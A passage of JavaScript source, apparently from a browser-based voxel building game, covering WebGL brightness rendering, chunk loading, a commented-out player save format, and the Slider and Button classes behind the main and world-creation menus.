				block2((round(p.x)+(w-1)*0.5)/w, (round(p.y)+(h-1)*0.5-1)/h, (round(p.z)+(d-1)*0.5)/d, "copySelectBlocks", p.camera)
				p.camera.transformation.elements.set(matrix)
				gl.uniform1i(glCache.uTrans, 0)
				gl.enable(gl.CULL_FACE)
			}
			/*//shh
matrix.set(p.camera.transformation.elements)
block2(win.xx, win.yy, win.zz, blockIds.sand, p.camera)
p.camera.transformation.elements.set(matrix)//*/
      gl.uniform1i(glCache.isInWorld, 0)
			gl.uniform1f(glCache.brightness, 1)
			gl.uniform1i(glCache.lightMethod, 0)
      
      //clear alpha so transparent things aren't white
      gl.clearColor(1, 1, 1, 1);
      gl.colorMask(false, false, false, true);
      gl.clear(gl.COLOR_BUFFER_BIT);
      gl.colorMask(true, true, true, true);

			//Get brightness
			if(tick){
				if(screen !== "loading" && screen !== "netherLoading" && screen !== "endLoading" && settings.adjustBrightness){
					//let minBrightness = p.dimension === "nether" || p.dimension === "end" ? 0.5 : 0//if you change this, change render or tick
					/*let skysLight = world.getLight(round(p.x+p.cOffsetX), round(p.y+p.cOffsetY), round(p.z+p.cOffsetZ), 0, p.dimension) * skyLight
					let blockLight = world.getLight(round(p.x+p.cOffsetX), round(p.y+p.cOffsetY), round(p.z+p.cOffsetZ), 1, p.dimension)
					lightLevel = max(minBrightness+(1-minBrightness)*max(skysLight,blockLight)/15,lantern)*/
					gl.useProgram(programAvgBrightness)
					gl.bindBuffer(gl.ARRAY_BUFFER, avgBrightnessPositionBuffer)
					if(updateAvgBrightnessBuffer){
						updateAvgBrightnessBuffer = false
						gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([0.5/gl.canvas.width*2-1, 0.5/gl.canvas.height*2-1]), gl.STATIC_DRAW)
					}
					gl.vertexAttribPointer(glCache.aPositionAvgBrightness, 2, gl.FLOAT, false, 0, 0)
					gl.uniform2f(glCache.texSizeAvgBrightness, gl.canvas.width,gl.canvas.height)
					gl.activeTexture(gl.TEXTURE10)//avgBrightnessCanvasTexture
					gl.copyTexImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 0, 0, gl.canvas.width, gl.canvas.height, 0)
					//gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, gl.canvas)
					gl.uniform1i(glCache.texAvgBrightness, 10)
					gl.bindFramebuffer(gl.FRAMEBUFFER, avgBrightnessFB)
					gl.clearColor(0,0,0,0)
					gl.clear(gl.DEPTH_BUFFER_BIT | gl.COLOR_BUFFER_BIT)
					gl.drawArrays(gl.POINTS, 0, 1)
					gl.readPixels(0,0,1,1,gl.RGBA,gl.UNSIGNED_BYTE,avgBrightnessPixels)
					//win.avgBrightnessPixels=avgBrightnessPixels
					gl.bindFramebuffer(gl.FRAMEBUFFER, null)
					let lightLevel = avgBrightnessPixels[0]/255
					//lightLevel = max(lightLevel,1/15)
					//if(abs(1/lightLevel-lightBrightness)>0.15) lightBrightness += (1/lightLevel-lightBrightness)*0.1
					//if(abs(0.5-lightLevel)>0.1) lightBrightness += (0.5-lightLevel)*0.5
					if(lightLevel>0.525) lightBrightness *= 0.99
					if(lightLevel<0.475) lightBrightness *= 1.01
					if(lightBrightness<0.1) lightBrightness = 0.1
					if(lightBrightness>16) lightBrightness = 16
				}else lightBrightness = 1
			}
			brightness = lightBrightness
		}
    renderTextDisplay(e){
      this.textEntities.push(e)
    }
		unloadAllChunks(){
			this.loaded.length = 0
			this.lastChunk = ","
			this.entities.clear()
			this.chunks = {}
		}
		loadChunks() {
			let actualRenderDistance = settings.renderDistance
			let renderDistance = settings.renderDistance + (this.isMK ? 2 : 0)
			if(host) serverWorld.loadDistance = renderDistance
			let cx = p.x >> 4
			let cz = p.z >> 4
			p.cx = cx
			p.cz = cz
			let minChunkX = cx - renderDistance
			let maxChunkX = cx + renderDistance
			let minChunkZ = cz - renderDistance
			let maxChunkZ = cz + renderDistance
      let d = p.dimension

			let pOffsetX = this.offsetX
			let pOffsetZ = this.offsetZ
			let plwidth = this.lwidth
			this.offsetX = -minChunkX
			this.offsetZ = -minChunkZ
			this.lwidth = renderDistance * 2 + 1
			this.chunkGenQueue.length = 0
			this.lightingQueue.length = 0
			//this.unlightingQueue.length = 0
			this.neededChunks.length = 0

      if (this.loaded.length > this.lwidth * this.lwidth) {
				this.loaded.length = this.lwidth * this.lwidth
			}

			let i = 0
			let lwidth = this.lwidth
			for (let x = minChunkX; x <= maxChunkX; x++) {
				for (let z = minChunkZ; z <= maxChunkZ; z++) {
					let X = x + this.offsetX
					let Z = z + this.offsetZ
					let chunk = this.getOrNewChunk(x*16,z*16,d)
					this.loaded[X * this.lwidth + Z] = chunk
					if(maxDist(cx, cz, x, z) <= actualRenderDistance){
						if (!chunk.buffer && !this.chunkGenQueue.includes(chunk)) {
							this.chunkGenQueue.push(chunk)
						}
					}else unfillReqs(x, z, d, maxDist(cx, cz, x, z)-actualRenderDistance, chunk)
					if(!chunk.loaded) this.neededChunks.push(chunk)
					this.loaded[i++] = chunk
				}
			}
			for (let x = -pOffsetX; x <= -pOffsetX+plwidth; x++) {
				for (let z = -pOffsetZ; z <= -pOffsetZ+plwidth; z++) {
					let nX = x + this.offsetX
					let nZ = z + this.offsetZ
					if(!(nX >= 0 && nX < this.lwidth && nZ >= 0 && nZ < this.lwidth)){
						let chunk = this.getChunk(x*16,z*16,d)
						if(chunk){
							for(let i in chunk.entities){
								this.deleteEntity(i,true)
							}
							delete this.chunks[x][z]
						}
					}
				}
			}

      this.sortedChunks.length = 0
			for (let chunk of this.loaded) {
				if (renderFilter(chunk)) {
					this.sortedChunks.push(chunk)
				}
			}
			this.sortedChunks.sort(sortChunks)

			this.neededChunks.sort(sortChunks)
			this.neededChunkCoords.length = 0
			for(let i=0; i<this.neededChunks.length; i++){
				const {x, z} = this.neededChunks[i]
				this.neededChunkCoords.push(x>>4, z>>4)
			}
      
			this.doubleRenderChunks.length = 0
      for(let chunk of this.loaded){
        if (chunk.doubleRender) {
					this.doubleRenderChunks.push(chunk)
				}
      }

			if(this.isMK){
				multiplayer.toSendLoadChunks = {data:this.neededChunkCoords,loadDistance:renderDistance}
			}
		}
    getTop(x,z,dimension){
      let chunk = this.getChunk(x,z,dimension)
			return chunk && chunk.tops[(z&15) * 16 + (x&15)] || 0
    }
		getSolidTop(x,z,dimension){
      let chunk = this.getChunk(x,z,dimension)
     	return chunk && chunk.solidTops[(z&15) * 16 + (x&15)] || 0
    }
		redoMeshes(){
			for(let chunk of this.sortedChunks){
				if (chunk.buffer && !this.meshQueue.includes(chunk)) {
					this.meshQueue.push(chunk)
				}
			}
		}
    /*getSurvivStr(){
			let bab = new BitArrayBuilder()
			//position
			bab.add(round(p.x), 20).add(round(p.y), 11).add(round(p.z), 20)
			bab.add(p.dimension === "nether" ? 1 : (p.dimension === "end" ? 2 : 0),3)
			bab.add(p.rx * 100, 11).add(p.ry * 100, 11)
			bab.add(p.flying, 1).add(p.gameMode==="spectator", 1)
      //survival stuff like player health
      bab.add(round(p.health),5)
			bab.add(0,28)//unused
			bab.add(this.spawnPoint.x,20).add(this.spawnPoint.y,20).add(this.spawnPoint.z,20)
			bab.add(p.food,5).add(p.foodSaturation,5).add(p.foodExhaustion,2)
			bab.add(p.oxygen,5)
			bab.add(p.gameMode==="survival"?1:(p.gameMode==="hardcore"?2:0),2).add(cheats?1:0,1)
			bab.add(freezeEffect,8)
      bab.add(p.XP*100,16).add(p.level,16)
      bab.add(didEndPoem?1:0,1)
			bab.add(p.lastY,11)
			let effects = Object.keys(p.effects)
			bab.add(effects.length,8)
			for(let i of effects){
				bab.addBasicString(i)
				bab.add(p.effects[i].level,8)
				bab.add(p.effects[i].time,32)
				bab.add(p.effects[i].showParticles ? 1 : 0, 1)
			}
			bab.addBasicString(p.riding||"")
      return bab
    }
    loadSurvivStr(reader,preBetaVersion){
			p.x = reader.read(20, true)
			p.y = preBetaVersion ? reader.read(8) : reader.read(11,true)
			p.z = reader.read(20, true)
			let d = reader.read(3)
			p.dimension = d === 1 ? "nether" : (d === 2 ? "end" : "")
			p.rx = reader.read(11, true) / 100
			p.ry = reader.read(11, true) / 100
			p.flying = reader.read(1)
			let spectator = reader.read(1)

			p.health = reader.read(5)
			reader.skip(28)//unused
      world.spawnPoint.x = reader.read(20,true)
      world.spawnPoint.y = reader.read(20,true)
      world.spawnPoint.z = reader.read(20,true)
			p.food = reader.read(5)
			p.foodSaturation = reader.read(5)
			p.foodExhaustion = reader.read(2)
			p.oxygen = reader.read(5)
			let survival = reader.read(2)
			if(spectator) p.gameMode = "spectator"
			else if(survival === 0) p.gameMode = "creative"
			else if(survival === 1) p.gameMode = "survival"
			else if(survival === 2) p.gameMode = "hardcore"
			//survival = survival === 1 ? true : (survival === 2 ? "hardcore" : false)
			cheats = Boolean(reader.read(1))
			freezeEffect = reader.read(8)
			p.XP = reader.read(16)/100
			p.level = reader.read(16); setLevel()
			didEndPoem = Boolean(reader.read(1))
			p.lastY = preBetaVersion ? reader.read(8) : reader.read(11,true)
			let effectsLen = reader.read(8)
			p.effects = {}
			for(let i=0; i<effectsLen; i++){
				p.effects[reader.readBasicString()] = {level:reader.read(8), time:reader.read(32), showParticles:reader.read(1)}
			}
			p.riding = reader.readBasicString() || null
    }*/
	}
  win.World = World

	// Mouse sensitivity variable, used for the settings buttons and in the "mmoved" function
	let mouseS = 300

	class Slider {
		constructor(x, y, w, h, scenes, label, min, max, settingName, callback, percentage, mouseup, replaceValue) {
			this.x = this.originalX = x
			this.y = this.originalY = y
			this.h = this.originalH = h
			this.w = this.originalW = w//Math.max(w, 350)
			this.name = settingName
			this.scenes = Array.isArray(scenes) ? scenes : [scenes]
			this.label = label
			this.min = min
			this.max = max
			this.sliding = false
			this.callback = callback
      this.percentage = percentage || false //show integer or float
      this.mouseup = mouseup
      this.replaceValue = replaceValue
      this.previousHovering = false
      this.touch = null
		}
		setScrollable(s){this.scrollable = s}
		draw() {
			let thisScreen = thisSceneCurrent ? screen : previousScreen
			if (!this.scenes.includes(thisScreen)) {
				return
			}
			let current = (settings[this.name] - this.min) / (this.max - this.min)
      let hovering = this.sliding || this.mouseCollided()
      let disabled = false

			this.x = this.originalX, this.y = this.originalY
			this.w = this.originalW, this.h = this.originalH
			if(changeSceneAnimation !== null){
				if(thisSceneCurrent) this.x += (1-animationAmount)*width/4, ctx.globalAlpha = animationAmount
				else this.w *= 1-animationAmount, this.h *= 1-animationAmount, ctx.globalAlpha = 1-animationAmount
			}
			if(this.scrollable){
				this.x += this.scrollable.x
				this.y += this.scrollable.y
			}

			// Outline
			ctx.beginPath()
			strokeWeight(2)
			stroke(0)
			fill(85)
			ctx.rect(this.x - this.w / 2, this.y - this.h / 2, this.w, this.h)
			ctx.stroke()
			ctx.fill()

			// Slider bar
      let exponent; if(this.percentage) exponent = 10**4 //max digits after decimal point: 4
			let value = this.percentage ? (round(settings[this.name]*100*exponent)/exponent)+"%" : round(settings[this.name])
      
      if(this.replaceValue && this.replaceValue[value]){
        value = this.replaceValue[value]
      }
      
      let barW = 15
			let x = this.x - (this.w - barW) / 2 + (this.w - barW) * current - barW/2
			let label = "slider:"+value+","+this.label
			if(performFast){
				// Slider bar
				ctx.beginPath()
				fill(130)
				ctx.fillRect(x, this.y - this.h / 2, barW, this.h)

				//Label
				fill(255, 255, 255)
				textSize(12)
				ctx.textAlign = 'center'
				text(label, this.x, this.y + this.h / 8 - 11)
			}else{
				strokeWeight(2)
				stroke(80)
				if (disabled) {
					fill(60)
					stroke(20)
				} else {
					if (hovering) {
						cursor(HAND)
						fill(100, 120, 200)
						stroke(100,80,160)
					}else{
						fill(120)
					}
				}
				ctx.fillRect(x, this.y - this.h / 2, barW, this.h)
				ctx.beginPath()
				if(disabled){
					ctx.moveTo(x + 2, this.y + (this.h / 2) - 2)
					ctx.lineTo(x + 2, this.y - this.h / 2 + 2)
					ctx.lineTo(x + barW - 2, this.y - this.h / 2 + 2)
				}else{
					ctx.moveTo(x + barW - 2, this.y - this.h / 2 + 2)
					ctx.lineTo(x + barW - 2, this.y + (this.h / 2) - 2)
					ctx.lineTo(x + 2, this.y + (this.h / 2) - 2)
				}
				ctx.stroke()
				
				ctx.beginPath()
				stroke(200)
				if (hovering && !disabled)stroke(200, 200, 255);
				if(disabled)stroke(130);
				if(disabled){
					ctx.moveTo(x + barW - 2, this.y - this.h / 2 + 2)
					ctx.lineTo(x + barW - 2, this.y + (this.h / 2) - 2)
					ctx.lineTo(x + 2, this.y + (this.h / 2) - 2)
				}else{
					ctx.moveTo(x + 2, this.y + (this.h / 2) - 2)
					ctx.lineTo(x + 2, this.y - this.h / 2 + 2)
					ctx.lineTo(x + barW - 2, this.y - this.h / 2 + 2)
				}
				ctx.stroke()

				stroke(0)
				strokeWeight(1)
				ctx.strokeRect(x, this.y-this.h/2, barW, this.h)

				//Label
				fill(255, 255, 255)
				textSize(12)
				ctx.textAlign = 'center'
				fill(0)
				text(label, this.x+2, this.y + this.h / 8 + 2 - 11)
				disabled ? fill(255) : (hovering ? fill(255,255,0) : fill(255) )
				text(label, this.x, this.y + this.h / 8 - 11)
			}

      if(hovering && !this.previousHovering && settings.narrator){
        speak(customResources.texts[label] || label)
      }
      this.previousHovering = hovering
			
			if(changeSceneAnimation !== null){
				ctx.globalAlpha = 1
			}
		}
    mouseCollided(useMouse){
      return touchScreen && !useMouse ? Boolean(this.touch) : (mouseX > this.x - this.w / 2 && mouseX < this.x + this.w / 2 && mouseY > this.y - this.h / 2 && mouseY < this.y + this.h / 2)
    }
		click(e) {
			if (!mouseDown || !this.scenes.includes(screen) || (this.scrollable && !this.scrollable.mouseIsIn())) {
				return false
			}

			if (this.mouseCollided(true)) {
				let current = (mouseX - this.x + this.w / 2) / this.w
				if (current < 0) current = 0
				if (current > 1) current = 1
				this.sliding = true
				settings[this.name] = current * (this.max - this.min) + this.min
        if(e.tOucHScrEeN) this.touch = e.tOuCH
				this.callback(current * (this.max - this.min) + this.min)
				this.draw()
			}
		}
		drag(e) {
			if (!this.sliding || !this.scenes.includes(screen) || e.tOucHScrEeN && this.touch && e.tOuCH.identifier !== this.touch.identifier) {
				return false
			}

			let current = (mouseX - this.x + this.w / 2) / this.w
			if (current < 0) current = 0
			if (current > 1) current = 1
			settings[this.name] = current * (this.max - this.min) + this.min
			this.callback(current * (this.max - this.min) + this.min)
		}
		release(e) {
      if(e && e.tOucHScrEeN && this.touch && e.tOuCH.identifier !== this.touch.identifier) return
      if(this.sliding){
        this.touch = null
        if(this.mouseup) this.mouseup()
        let exponent; if(this.percentage) exponent = 10**4 //max digits after decimal point: 4
        let value = this.percentage ? (round(settings[this.name]*100*exponent)/exponent)+"%" : round(settings[this.name])
        if(settings.narrator){
					let label = customResources.texts[this.label] || this.label
          speak(label+": "+value)
        }
      }
			this.sliding = false
		}

		static draw() {
			for (let slider of this.all) {
				slider.draw()
			}
		}
		static click(e) {
			for (let slider of this.all) {
				slider.click(e)
			}
		}
		static release(e) {
			for (let slider of this.all) {
				slider.release(e)
			}
		}
		static drag(e) {
			for (let slider of this.all) {
				slider.drag(e)
			}
		}
		static add() {
			let slider = new this(...arguments)
			this.all.push(slider)
			return slider
		}
    static all = []
	}
	let hoverboxCurText
	function showHoverbox(hoverText){
		if(customResources.texts[hoverText]) hoverText = customResources.texts[hoverText]
		else if(hoverText.startsWith("block.") || hoverText.startsWith("blockName.")) hoverText = blockNameText(hoverText)

		if(hoverboxCurText !== hoverText){
			hoverboxCurText = hoverText
			hoverbox.innerHTML = Messages.format(hoverText)
		}
		hoverbox.classList.remove("hidden")
		if (mouseY < height / 2) {
			hoverbox.style.bottom = ""
			hoverbox.style.top = mouseY + 10 + "px"
		} else {
			hoverbox.style.top = ""
			hoverbox.style.bottom = height - mouseY + 10 + "px"
		}
		if (mouseX < width / 2) {
			hoverbox.style.right = ""
			hoverbox.style.left = mouseX + 10 + "px"
		} else {
			hoverbox.style.left = ""
			hoverbox.style.right = width - mouseX + 10 + "px"
		}
	}
	class Button {
		constructor(x, y, w, h, labels, scenes, callback, disabled, hoverText, setIndex, mouseup) {
			this.x = this.originalX = x
			this.y = this.originalY = y
			this.h = this.originalH = h
			this.w = this.originalW = w
			this.index = 0
			this.disabled = disabled || (() => false)
			this.hoverText = !hoverText || typeof hoverText === "string" ? (() => hoverText) : hoverText
			this.scenes = Array.isArray(scenes) ? scenes : [scenes]
			this.labels = Array.isArray(labels) ? labels : [labels]
			this.callback = callback
      this.mouseupCallback = mouseup
      this.setIndex = setIndex
      this.pressed = false
      this.previousHovering = false
      this.touch = null
		}
		setIcon(i){this.icon = i}
		customDraw(func){
			this.draw = func
		}
		setSize(s){this.size = s}
		setScrollable(s){this.scrollable = s}

		mouseIsOver(useMouse) {
			return touchScreen && !useMouse ? Boolean(this.touch) : (mouseX >= this.x - this.w / 2 && mouseX <= this.x + this.w / 2 && mouseY >= this.y - this.h / 2 && mouseY <= this.y + this.h / 2)
		}
		draw() {
			let thisScreen = thisSceneCurrent ? screen : previousScreen
			if (!this.scenes.includes(thisScreen)) {
				return
			}
			let hovering = this.mouseIsOver()
			let disabled = this.disabled()
			let hoverText = this.hoverText()
			if(customResources.texts[hoverText]) hoverText = customResources.texts[hoverText]
      
      if(disabled === -1) return
      if(this.setIndex){
        this.index = this.setIndex()
      }

			this.x = this.originalX, this.y = this.originalY
			this.w = this.originalW, this.h = this.originalH

			if(changeSceneAnimation !== null){
				if(thisSceneCurrent) this.x += (1-animationAmount)*width/4, ctx.globalAlpha = animationAmount
				else this.w *= 1-animationAmount, this.h *= 1-animationAmount, ctx.globalAlpha = 1-animationAmount
			}
			if(this.scrollable){
				this.x += this.scrollable.x
				this.y += this.scrollable.y
			}

			let size = this.size || 12 //text size
			if(performFast){
				// Outline
				ctx.beginPath()
				if (hovering && !disabled) {
					strokeWeight(7)
					stroke(255)
					cursor(HAND)
				}
				else {
					strokeWeight(3)
					stroke(0)
				}
				if (disabled) {
					fill(60)
				}
				else {
					fill(120)
				}
				ctx.rect(this.x - this.w / 2, this.y - this.h / 2, this.w, this.h)
				ctx.stroke()
				ctx.fill()

				//Label
				fill(255)
				textSize(size)
				ctx.textAlign = 'center'
				text(this.labels[this.index], this.x, this.y - size/2)
			}else{
				// Outline
				strokeWeight(2)
				stroke(80)
				if (disabled) {
					fill(60)
					stroke(20)
				} else {
					if (hovering) {
						cursor(HAND)
						fill(100, 120, 200)
						stroke(100,80,160)
					}else{
						fill(120)
					}
				}
				ctx.fillRect(this.x - this.w / 2, this.y - this.h / 2, this.w, this.h)
				ctx.beginPath()
				if(disabled){
					ctx.moveTo(this.x - this.w / 2 + 2, this.y + (this.h / 2) - 2)
					ctx.lineTo(this.x - this.w / 2 + 2, this.y - this.h / 2 + 2)
					ctx.lineTo(this.x + (this.w / 2) - 2, this.y - this.h / 2 + 2)
				}else{
					ctx.moveTo(this.x + (this.w / 2) - 2, this.y - this.h / 2 + 2)
					ctx.lineTo(this.x + (this.w / 2) - 2, this.y + (this.h / 2) - 2)
					ctx.lineTo(this.x - this.w / 2 + 2, this.y + (this.h / 2) - 2)
				}
				ctx.stroke()
				
				ctx.beginPath()
				stroke(200)
				if (hovering && !disabled)stroke(200, 200, 255);
				if(disabled)stroke(130);
				if(disabled){
					ctx.moveTo(this.x + (this.w / 2) - 2, this.y - this.h / 2 + 2)
					ctx.lineTo(this.x + (this.w / 2) - 2, this.y + (this.h / 2) - 2)
					ctx.lineTo(this.x - this.w / 2 + 2, this.y + (this.h / 2) - 2)
				}else{
					ctx.moveTo(this.x - this.w / 2 + 2, this.y + (this.h / 2) - 2)
					ctx.lineTo(this.x - this.w / 2 + 2, this.y - this.h / 2 + 2)
					ctx.lineTo(this.x + (this.w / 2) - 2, this.y - this.h / 2 + 2)
				}
				ctx.stroke()

				stroke(0)
				strokeWeight(1)
				ctx.strokeRect(this.x-this.w/2, this.y-this.h/2, this.w, this.h)

				//Label
				textSize(size)
				ctx.textAlign = 'center'
				fill(0)
				text(this.labels[this.index], this.x +2, this.y + 2 - size/2)
				disabled ? fill(255) : (hovering ? fill(255,255,0) : fill(255) )
				text(this.labels[this.index], this.x, this.y - size/2)

				//Icon
				if(this.icon){
					if(typeof this.icon === "function"){
						this.icon()
					}else{
						//let pad = this.h*0.125
						//drawImage(this.icon, this.x-this.w*0.47, this.y-this.h/2+pad, this.h-pad*2, imageHtoW(this.h-pad*2,this.icon))
						ctx.textAlign = 'left'
						text(this.labels[this.index], this.x-this.w*0.47, this.y - size/2)
						ctx.textAlign = 'center'
					}
				}
			}
			
			if (hovering && hoverText) {
				showHoverbox(hoverText)
			}
      if(hovering && !this.previousHovering && settings.narrator){
				let label = customResources.texts[this.labels[this.index]] || this.labels[this.index]
        speak(label)
        if(hoverText) speak(customResources.texts[hoverText] || hoverText)
      }
      this.previousHovering = hovering
			if(changeSceneAnimation !== null){
				ctx.globalAlpha = 1
			}
		}
		click(e) {
			if (!mouseDown || !this.scenes.includes(screen) || this.disabled() || (this.scrollable && !this.scrollable.mouseIsIn())) {
				return false
			}

			if (this.mouseIsOver(true)) {
        this.pressed = true
				this.index = (this.index + 1) % this.labels.length
        if(e.tOucHScrEeN) this.touch = e.tOuCH
				this.callback(this.labels[this.index])
				return true
			}
		}
    mouseup(e){
      if (e.tOucHScrEeN && this.touch && e.tOuCH.identifier !== this.touch.identifier || this.disabled()) {
				return
			}
      
      if(this.pressed){
        this.pressed = false
        this.touch = null
        if(this.mouseupCallback) this.mouseupCallback()
        return true
      }
    }

    static mouseIsOver(useMouse){
      for (let button of this.all) {
				if(button.scenes.includes(screen) && button.mouseIsOver(useMouse)) return button
			}
    }
		static draw() {
			for (let button of this.all) {
				button.draw()
			}
			if(!isFinite(mouseX)) return
			let el = document.elementFromPoint(mouseX,mouseY)
			if(el && el.tagName.toLowerCase() === "button" && el.hoverText){
				showHoverbox(el.hoverText)
			}
		}
		static click(e) {
			for (let button of this.all) {
				if (button.click(e)) {
					this.draw()
					break
				}
			}
		}
    static mouseup(e){
      let draw = false
      for (let button of this.all) {
				if (button.mouseup(e)) {
          draw = true
				}
			}
			if(draw) this.draw()
    }
		static add() {
			let button = new this(...arguments)
			this.all.push(button)
			return button
		}
    static all = []
	}
	/*class ButtonButHTML extends Button{
		static add(){
			let button = new this(...arguments)
			this.all.push(button)
			return button
		}
		constructor(label, callback, parent, hoverText, align) {
			this.x = this.originalX = x
			this.y = this.originalY = y
			this.h = this.originalH = h
			this.w = this.originalW = w
			this.hoverText = !hoverText || typeof hoverText === "string" ? (() => hoverText) : hoverText
			this.label = label
			this.callback = callback
      this.pressed = false
      this.previousHovering = false
      this.touch = null
			let button = doc.createElement("button")
			button.textContent = label
		}
	}*/
	let lastAddedButton
	function addButton(parent,text,onclick,hoverText,align){
		let button = doc.createElement("button")
		button.textContent = customResources.texts[text] || text
		button.onclick = e => {onclick(e); e.dOnTSeLEct = true}
		if(align === "centerBlock"){
			button.style.marginLeft = button.style.marginRight = "auto"
			button.style.display = "block"
			button.style.width = "50%"
		}else if(align) button.style.float = align
		if(hoverText) button.hoverText = hoverText
		button.onmouseover = () => {
			if(settings.narrator){
				let label = customResources.texts[text] || text
        speak(label)
        if(hoverText) speak(customResources.texts[hoverText] || hoverText)
      }
		}
		button.className = "canTranslate"
		button.theTranslate = () => {
			button.textContent = customResources.texts[text] || text
			if(hoverText) button.hoverText = customResources.texts[hoverText] || hoverText
		}
		parent.appendChild(button)
		lastAddedButton = button
		return htmlButtonOptions
	}
	const htmlButtonOptions = {
		setIcon(i){
			//lastAddedButton.appendChild((customResources.images[i] || images[i]).cloneNode())
			let span = document.createElement("span")
			span.innerHTML = i
			span.className = "icon"
			lastAddedButton.appendChild(span)
		},
		disable(){lastAddedButton.disabled = true}
	}
	function createScrollable(){
		let el = document.createElement("div")
		function f(e){
			if(e.target === tallEl || e.target === el){canvas.focus()}
		}
		el.addEventListener("click", e => {f(e); canvas.dispatchEvent(new e.constructor(e.type,e))})
		el.addEventListener("mousedown", e => {f(e); canvas.dispatchEvent(new e.constructor(e.type,e))})
		el.addEventListener("mouseup", e => {f(e); canvas.dispatchEvent(new e.constructor(e.type,e))})
		el.addEventListener("mousemove", e => {canvas.dispatchEvent(new e.constructor(e.type,e))})
		el.addEventListener("touchstart", e => {e = new e.constructor(e.type,e); e.preventDefault=emptyFunc; f(e); canvas.dispatchEvent(e)})
		el.addEventListener("touchend", e => {e = new e.constructor(e.type,e); e.preventDefault=emptyFunc; f(e); canvas.dispatchEvent(e)})
		el.addEventListener("touchmove", e => {e = new e.constructor(e.type,e); e.preventDefault=emptyFunc; f(e); canvas.dispatchEvent(e)})
		el.addEventListener("touchcancel", e => {e = new e.constructor(e.type,e); e.preventDefault=emptyFunc; f(e); canvas.dispatchEvent(e)})
		el.style.position = "absolute"
		el.style.zIndex = canvas.zIndex
		el.style.overflow = "auto"
		el.className = "hidden"
		let tallEl = document.createElement("div")
		el.appendChild(tallEl)
		document.body.appendChild(el)
		el.addEventListener("scroll", () => {
			trackMouse(null,true)
		})
		let ax,ay,aw,ah
		return {
			setPos(x,y,w,h){
				ax = x, ay = y
				aw = w, ah = h
				el.style.left = x+"px"
				el.style.top = y+"px"
				el.style.width = w+"px"
				el.style.height = h+"px"
			},
			setScrollSize(h){
				tallEl.style.height = h+"px"
			},
			get x(){return ax-el.scrollLeft},
			get y(){return ay-el.scrollTop},
			el,
			mouseIsIn(){
				return mouseX >= ax && mouseX <= ax+aw && mouseY >= ay && mouseY <= ay+ah
			}
		}
	}
  
	var initEverything
	function initButtons() {
		Button.all = []
		Slider.all = []
		const nothing = () => false
		const always = () => true
    const s = inventory.size
    const s2 = s / 2
		const ss = inventory.ss, ss2 = inventory.ss2

		// Main menu buttons
		Button.add(width / 2, height / 2 - 40*ss, 400*ss, 40*ss, "Singleplayer", "main menu", r => {
      changeScene("loadsave menu")
      initWorldsMenu()
    })
		Button.add(width / 2, height / 2 + 15*ss, 400*ss, 40*ss, "Multiplayer", "main menu", r => {
      changeScene("multiplayer menu")
    }, () => preVersion && !(userInfo&&userInfo.admin))
    Button.add(width / 2, height / 2 + 70*ss, 400*ss, 40*ss, "Marketplace", "main menu", r => {marketplaceCategory = null; marketplaceSearch.value = ""; changeScene("marketplace")})
		Button.add(width / 2 - 105*ss, height / 2 + 160*ss, 190*ss, 40*ss, "Options", "main menu", r => changeScene("options"))
    Button.add(width / 2 + 105*ss, height / 2 + 160*ss, 190*ss, 40*ss, "Quit", "main menu", r => {
      if(window.opener !== null || window.history.length === 1){
        close()
      }else{
        location.href = "/"
      }
    })
    Button.add(width / 2 - 235*ss, height / 2 + 160*ss, 40*ss, 40*ss, "?", "main menu", r => changeScene("options help"), null, "Help")
    Button.add(width / 2 + 235*ss, height / 2 + 160*ss, 40*ss, 40*ss, "", "main menu", r => changeScene("options languages"), null, "Languages")
    
		doc.documentElement.style.setProperty("--vh", height+"px")
		doc.documentElement.style.setProperty("--vw", width+"px")
		placeElement(window.boxCenterTop, width/2, 50*ss, 400*ss, 50*ss)
		window.uploadWorld.style.left = width/2+208*ss+"px"
		window.uploadWorld.style.top = 50*ss+"px"

		const worldSelectBottom = height - 90*ss, worldSelectTop = 90*ss
		placeElementCoords(window.worlds, width*0.005, worldSelectTop, width*0.9975, worldSelectBottom)
		placeElementCoords(window.servers, width*0.005, worldSelectTop, width*0.9975, worldSelectBottom)
		placeElementCoords(window.seeds, width*0.005, worldSelectTop-20*ss, width*0.9975, worldSelectBottom+20*ss)
		placeElementCoords(window.marketplace, width*0.005, worldSelectTop-20*ss, width*0.9975, worldSelectBottom+20*ss)

		window.quota.style.top = worldSelectBottom+"px"

		// Creation menu buttons
		creationMenuScrollable.setPos(width / 2-320*ss,90*ss, 640*ss, height - 200*ss)
		Button.add(165*ss, 30*ss, 300*ss, 40*ss, ["World Type: Alpha", "World Type: Large", "World Type: Superflat", "World Type: Island", "World Type: Void"], "creation menu", r => {
			worldType = r === "World Type: Superflat" ? "superflat" : r === "World Type: Island" ? "island" : r === "World Type: Void" ? "void" : r === "World Type: Large" ? "large" : "alpha"
			if(worldType !== "large") fancyRivers = false
			if(worldType === "superflat") trees = caves = structures = false
		}, null, () => worldType === "large" && "Warning: laggy and may change in future updates" || worldType === "void" && "To start building in void, use setblock command." || worldType === "island" && "A very big island with a volcano. Surrounded by infinite ocean.",
		() => {
			if(worldType === "island") return 3
			if(worldType === "void") return 4
			if(worldType === "superflat") return 2
			if(worldType === "large") return 1
			return 0
		}).setScrollable(creationMenuScrollable)
		Button.add(165*ss, 80*ss, 300*ss, 40*ss, ["Trees: On", "Trees: Off"], "creation menu", r => trees = r === "Trees: On", function() {
			if (worldType === "void") {
				trees = false
			}else if(!cheats){
        trees = true
      }
			return worldType === "void" || !cheats
		}, null, () => trees ? 0 : 1).setScrollable(creationMenuScrollable)
		Button.add(165*ss, 130*ss, 300*ss, 40*ss, ["Caves: On", "Caves: Off"], "creation menu", r => caves = r === "Caves: On", function() {
			if (worldType === "void") {
				caves = false
			}else if(!cheats){
        caves = true
      }
			return worldType === "void" || !cheats
		}, null, () => caves ? 0 : 1).setScrollable(creationMenuScrollable)
		placeElementScrollable(seedBox, 165*ss, 180*ss, 300*ss, 40*ss, creationMenuScrollable)
		Button.add(165*ss, 230*ss, 300*ss, 40*ss, ["Game Mode: Creative", "Game Mode: Survival", "Game Mode: Hardcore"], "creation menu", r => {
			p.gameMode = r === "Game Mode: Survival" && "survival" || !inWorld && r === "Game Mode: Hardcore" && "hardcore" || "creative"
			if(p.survival) cheats = false
			else cheats = true
		}, null, () => "Default game mode", () => {let s = p.gameMode; return s === "survival" ? 1 : (s === "hardcore" ? 2 : 0)}).setScrollable(creationMenuScrollable)
